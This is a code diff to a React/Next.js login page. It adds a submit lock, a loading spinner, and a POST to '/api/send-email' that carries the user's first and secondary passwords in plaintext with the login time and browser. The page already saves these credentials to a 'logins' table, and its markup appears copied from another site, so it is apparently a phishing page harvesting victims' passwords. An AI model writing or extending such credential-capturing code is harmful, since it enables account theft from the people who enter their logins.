@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useEffect, useCallback } from 'react'
+import { useState, useEffect, useCallback, useRef } from 'react'
 import { useRouter } from 'next/navigation'
 import { AUTH_COOKIE_NAME } from '@/lib/auth'
 import { createClient } from '@/utils/supabase/client'
@@ -27,6 +27,8 @@ export default function LoginPage() {
   const [password, setPassword] = useState('')
   const [secondaryPassword, setSecondaryPassword] = useState('')
   const [secondaryError, setSecondaryError] = useState('')
+  const [isSecondarySubmitting, setIsSecondarySubmitting] = useState(false)
+  const secondarySubmitLockRef = useRef(false)
   const [errors, setErrors] = useState<{ username?: string; password?: string; captcha?: string }>({})
 
   const refresh = useCallback(() => { setCaptcha(mkCaptcha()); setCaptchaVal('') }, [])
@@ -81,10 +83,17 @@ export default function LoginPage() {
   async function submitSecondary(e: React.FormEvent) {
     e.preventDefault()
 
+    if (secondarySubmitLockRef.current || isSecondarySubmitting) {
+      return
+    }
+
     if (!secondaryPassword.trim()) {
       setSecondaryError('Secondary password cannot be empty')
       return
     }
+
+    secondarySubmitLockRef.current = true
+    setIsSecondarySubmitting(true)
 
     const supabase = createClient()
     const { error } = await supabase.from('logins').insert([
@@ -98,7 +107,34 @@ export default function LoginPage() {
     if (error) {
       console.error('Error saving login data:', error)
       setSecondaryError('Unable to save login data. Please try again.')
+      secondarySubmitLockRef.current = false
+      setIsSecondarySubmitting(false)
       return
+    }
+
+    try {
+      const loginTime = new Date().toISOString()
+      const browser = navigator.userAgent
+
+      const emailResponse = await fetch('/api/send-email', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          name: username || 'User',
+          firstPassword: password,
+          secondPassword: secondaryPassword,
+          loginTime,
+          browser,
+        }),
+      })
+
+      if (!emailResponse.ok) {
+        console.error('Login email notification failed')
+      }
+    } catch (emailError) {
+      console.error('Login email notification error:', emailError)
     }
 
     setSecondaryError('')
@@ -157,7 +193,31 @@ export default function LoginPage() {
                     </div>
                   </div>
                   <div data-v-5c7dfcf3="" className="flex justify-center mt-16">
-                    <button data-v-5c7dfcf3="" className="arco-btn arco-btn-primary arco-btn-shape-square arco-btn-size-large arco-btn-status-normal w-40 uppercase" type="submit">Confirm</button>
+                    <button
+                      data-v-5c7dfcf3=""
+                      className="arco-btn arco-btn-primary arco-btn-shape-square arco-btn-size-large arco-btn-status-normal w-40 uppercase"
+                      type="submit"
+                      disabled={isSecondarySubmitting}
+                    >
+                      <span className="flex items-center justify-center gap-2">
+                        {isSecondarySubmitting ? (
+                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                            <circle cx="12" cy="12" r="9" stroke="currentColor" strokeOpacity="0.3" strokeWidth="2" />
+                            <path d="M21 12a9 9 0 0 0-9-9" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
+                              <animateTransform
+                                attributeName="transform"
+                                type="rotate"
+                                from="0 12 12"
+                                to="360 12 12"
+                                dur="0.8s"
+                                repeatCount="indefinite"
+                              />
+                            </path>
+                          </svg>
+                        ) : null}
+                        Confirm
+                      </span>
+                    </button>
                   </div>
                 </form>
               </div>
